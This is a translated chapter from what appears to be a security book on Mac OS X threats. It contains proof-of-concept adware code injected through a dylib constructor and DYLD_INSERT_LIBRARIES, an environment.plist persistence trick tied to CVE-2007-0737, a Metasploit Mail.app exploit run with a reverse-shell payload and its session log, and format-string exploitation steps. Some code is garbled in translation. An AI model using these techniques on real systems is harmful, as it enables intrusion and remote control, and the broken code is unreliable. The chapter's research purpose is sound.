
# 过去与现在的威胁

使用 `ipcs` 命令，我们可以看到默认情况下没有任何程序在使用共享内存。

```
localhost:~ kfinistere$ ipcs
IPC status from <running system> as of Wed 28 01:00:57 EST 2007
T ID      KEY MODE      OWNER GROUP
Message Queues:
T ID      KEY MODE      OWNER GROUP
Shared Memory:
T ID      KEY MODE      OWNER GROUP
Semaphores:
```

## 第2章 过去与现在的威胁

```
localhost:Desktop kfinisterre$ id
iAdware started
uid=504(kfinisterre) gid=504(kfinisterre)
groups=504(kfinisterre), 102(com.apple.sharepoint.group.2),101(com.apple.sharepoint.group.1),98 (_lpadmin),81(_apperservadm),103(com.apple.sharepoint.group.3),79(_appusersver), 80(admin),20(staff)
localhost:Desktop kfinisterre$ id
iAdware already running
uid=504(kfinisterre) gid=504(kfinisterre)
groups=504(kfinisterre), 102(com.apple.sharepoint.group.2),101(com.apple.sharepoint.group.1),98 (_lpadmin),81(_apperservadm),103(com.apple.sharepoint.group.3),79(_appusersver), 80(admin),20(staff)
```

在上方你可以看到与 iAdware 感染相关的初始启动以及随后的拒绝启动。

```
localhost:Desktop kfinisterre$ ipcs
IPC status from <running system> as of Nov 28 01:02:55 EST 2007
T ID KEY MODE OWNER GROUP
Message Queues:
T ID KEY MODE OWNER GROUP
Shared Memory:
T ID KEY MODE OWNER GROUP
Semaphores:
s 262144 0x41424344 --ra-ra- kfinisterre kfinisterre
```

下面的代码演示了在动态库文件中使用构造函数，该构造函数将用于启动 iAdware 实例。任何加载 iAdware 库文件的应用程序都会立即检查系统上是否存在键为 `0x41424344` 的信号量键，如果不存在，则将启动 iAdware。这是因为构造函数会在库加载时立即通知执行该操作。

```
localhost:Desktop kfinisterre$ cat iAdware.c
iAdware already running
// gcc -dynamicclib iAdware.c -o iAdware.dylib

#include <stdio.h>
#include <sys/sem.h>

extern char * argv;
__attribute__((constructor))
static void iAdware()
{
    int x;
```

```c
if ((x = semget(0x41424344, 2, 0777 | IPC_CREAT | IPC_EXCL)) = -1)
{
  fprintf(stderr, "iAdware already running\n");
  return;
}
```

```c
else
{
  system("/Users/Shared/iAdware.app/Contents/MacOS/iAdware");
  fprintf(stderr, "iAdware started\n");
  system("/usr/bin/touch /tmp/iAdware");
}
```

测试此类潜在恶意软件可以通过设置 `DYLD_INSERT_LIBRARIES` 环境变量来完成。

```
localhost:Desktop kfinisterre$ export
LD_INSERT_LIBRARIES=/Users/kfinisterre/Desktop/iAdware.dylib
```

Apple SimpleCarbon 的修改版本将作为我们恶意软件的通道，向用户传递基于广告的内容。如果你安装了 Xcode，可以从 `/Developer/Examples/SimpleCarbon/` 派生出类似的示例。

```
localhost:iAdware kfinisterre$ ls
English.lproj WebWindow.m iAdware_Prefix.pch Info.plist WebWindow.h main.c
```

本质上，该应用程序下载并强制它打开一个随机生成的 URL。

```c
int main(int argc, char* argv[])
{
  // 需要进行更好的随机化。
  char urlz[8] = "http://www.digitalmunition.com";
  urlz[1] = "http://www.symantec.com/nav/nav_mac";
  urlz[2] = "http://www.sophos.com/products/endpoint/sav-mac.html";
  urlz[3] = "http://www.intego.com/virusbarrier";
  urlz[4] = "http://www.clamav.com";
  urlz[5] = "http://www.cafee.com/enterprise/anti_virus/file_servers_direct.htm";
```

```c
urlz[6] = "http://docs.apple.com/article.html?artnum=61798";
urlz[7] = "http://www.securityfocus.com";
...
rand(time(NULL));

// 从字符串转换为 CFString
CFString ref = CFStringWithCString(alloc, urlz[rand() % 8], encoding);
...
```

完整的示例可以从 www.digitalmunition.com/iAdware_sample.gz 下载。

```
localhost:tmp kfinisterre$ tar zzf iAdware_sample.gz
.MacOS/
.MacOS/environment.plist
Users/Shared/iadware.app/
Users/Shared/iAdware.app/Contents/Info.plist
Users/Shared/iAdware.app/Contents/MacOS/iAdware
Users/Shared/iAdware.app/Contents/PkgInfo
Users/Shared/iAdware.app/Contents/Resources/
Users/Shared/iAdware.app/Contents/Resources/English.lproj/
Users/Shared/iAdware.app/Contents/Resources/English.lproj/Plist.strings
Users/Shared/iAdware.app/Contents/Resources/English.lproj/main.nib/classes.nib
Users/Shared/iAdware.app/Contents/Resources/English.lproj/main.nib/info.nib
Users/Shared/iAdware.app/Contents/Resources/English.lproj/main.nib/objects.xib
Users/Shared/iadware.dylib
```

这个特定的示例使用了一种以前记录过的修改用户 `environment.plist` 文件的技术。你会发现这种技术在非 Leopard 系统上不再如预期那样工作，就像它以前那样。根据 CVE-2007-0737，Apple 更改了登录窗口处理环境变量的方式。根据 DYLD 的 Apple 更新 2007-004，变量被忽略了。

存在一个已修复的问题，导致登录窗口在某些情况下放弃 root 权限。根据 Apple 更新，iAdware 能够利用该机制。

### 登录窗口

CVE-ID: CVE-2007-0737

| 字段 | 详情 |
| :--- | :--- |
| 可用 | Mac OS X 10.3, Mac OS Server 10.3, Mac OS X 10.4, Mac OS Server 10.4 |
| 影响 | 本地用户可能获得系统权限 |
| 描述 | 登录窗口未充分检查其环境变量。这可能允许本地用户以系统权限执行任意代码。此更新通过改进登录窗口的验证解决了该问题。 |

（参见 http://docs.apple.com/article.html?artnum=305509。）一旦样本解压并安装，用户下次登录系统时将弹出一个。由于没有使用 Safari，它的弹出窗口拦截器没有任何用。

### 图 2.4 病毒屏障

![](img/792dbeecc8fbe4973ef2b3a6427b61de_67_0.png)

在更恶意的场景，而不是弹出广告，聪明的攻击者可能会使用像 Metasploit 这样的现有代码制作带有可变负载的快速漏洞。例如，在编写本章时，一个未修复的 Apple Mail.app 漏洞被 Heise 安全披露。他们提供的演示在展示漏洞威力方面相对无效。漏洞利用中的负载仅仅是一个目录列表。

由于我认为事情可以更有创意，我花时间为该问题制作了一个真正的 Metasploit 模块。（参见 http://metasploit.com/svn/framework3/trunk/modules/exploits/osx/email/mailapp_image_exec.rb。）

运行该模块证明比标准的 Heise 演示有趣得多。

```
localhost:Desktop finisterre $ svn co
http://metasploit.com/svn/framework3/trunk/ msf30
...
检出版本 5218。
localhost:Desktop finisterre $ /msfcli exploit/osx/email/mailapp_image_exec
MAILTO=vuln.vuln MAILFROM=kf@digitalmunition.com RPORT=25 MAILSUBJECT=pwned
RHOST=yourmetpserver.com TARGET=1 PAYLOAD=osx/x86/shell_reverse_tcp
LHOST=192.168.2.40 E
```

+   *] 启动了反向处理程序

![](img/792dbeecc8fbe4973ef2b3a6427b61de_68_0.png)

+ * 正在连接到 SMTP 服务器 mail.cfm.ohio-state.edu:25...

* ] SMTP: 220 mail.cfm.ohio-state.edu ESMTP Postfix (Debian/GNU)

* ] SMTP: 250-mail.cfm.ohio-state.edu

```
250-PIPELINING
250-SIZE 90240000
250-VRFY
250-ETRN
250-AUTH LOGIN PLAIN
250-ENHANCEDSTATCODES
250-8BITIME
250 DSN
* ] SMTP: 250 2.1.0 Ok
* ] SMTP: 250 2.1.5 Ok
* ] 正在发送消息 (31631 bytes)...
* ] SMTP: 354 End data with <CR><LF><CR><LF>
* ] SMTP: 250 2.0.0 Ok: 已入队为 8ACE2800F
* ] 正在关闭连接...
* ] SMTP: 221 2.0.0 Bye
```

+ * 正在等待负载会话（后台）...

* 命令 shell 会话 1 已打开 (192.168.2.40:4444 -> 192.168.2.40:53812

```
id
uid=504(kfinisterre) gid=504(kfinisterre)
groups=504(kfinisterre),102(com.apple.sharepoint.group.2),101(com.apple.sharepoint.group.1),98(_lpadmin)
81(_appiserverdm),103(com.apple.sharepoint.
group.3),79(_appiserverus),80(admin),
20(staff)
```

在邮件客户端侧，用户在启动新终端后，将在屏幕上看到以下命令。

```
Last login: Mon Nov 26 17:38:14 tty002
/Users/kfinisterre/Library/Mail/Downloads/FHnke.jpg ; exit;
localhost~ kfinisterre$ /Users/kfinisterre/Library/Mail\
Downloads/FHnke.jpg ; exit;
```

Metasploit 插件在邮件正文中封装了一个小的存根程序（`stub`），并构造了一封随后会执行该存根程序的邮件。如果存根程序启动，会话将发送回 Metasploit 控制台供用户交互。一个完全交互式的远程 shell 就等同于物理操作该机器的键盘。对于完全攻击者来说，这等同于物理上回到了他想要去的地方。

## 漏洞开发与研究

我们之前涵盖的大量信息在某种程度上依赖于已经存在的技术。例如，CrossOver OSX 漏洞利用与你利用 Windows 机器的技术大体相同。另一个例子是 Rosetta 漏洞利用与标准的基于 PowerPC 的 OSX 利用并没有区别。

在某些情况下，有必要开发新技术才能成功。OSX 提供了许多机遇。例如，当 OSX 首次推出 Intel X86 版本时，我赶紧买了一台 Macintosh mini，以便研究绕过不可执行栈的技术。我研究了一种适用于格式化字符串攻击的技术。最终，我写了一篇关于该技术的论文，找到了一个良好的漏洞示例随之发布，并提交了出版。随着 Leopard 的出现，似乎事情发生了一些变化。当我再次尝试我的旧技术时，发现它已经不起作用了。

利用格式化字符串问题的第一步是在栈上找到你的输入，并随后使用它写入你选择的内存地址。通过使用 `%x%x` 作为栈弹出（`stack pop`），我们能够找到自己的输入。在这种情况下，在栈的第 6 个位置我们找到了 "DCBA" 或 `0x41424344`。

```
localhost:leopard_stubs kfinisterre gdb -q ./vuln
Reading symbols for shared libraries ...
(gdb) r `perl -e 'print pack(\'l', 0x41424344) . "%x.%x.%x.%x.%x"'
Starting program: /Users/kfinisterre/Desktop/leopard_stubs/vuln `perl -e 'print pack(\'l', 0x41424344) . "%x.%x.%x.%x.%x"'
Reading symbols for shared libraries +. done
DCBAbffff0a.8e06ef8.8e0f15b.bffff740.2.41424344
Program exited with code 012.
```

之前，我们将 `dyl_stub__cxa_finalize` 作为执行任意代码的方法。这似乎不再是一个可行的方案。当我们尝试写入此位置时，收到了内核保护失败错误（Kernel Protection Failure）。

```
(gdb) p dyl_stub__cxa_finalize
$1 = <text variable, no debug info> 0xa0a9d539 <dyl_stub__cxa_finalize>
(gdb) r `perl -e 'print pack(\'l', 0x0a09d539) . "%x.%x.%x.%x.%x"'
Starting program: /Users/kfinisterre/Desktop/leopard_stubs/vuln `perl -e 'print pack(\'l', 0x0a09d539) . "%x.%x.%x.%x.%x"'
```
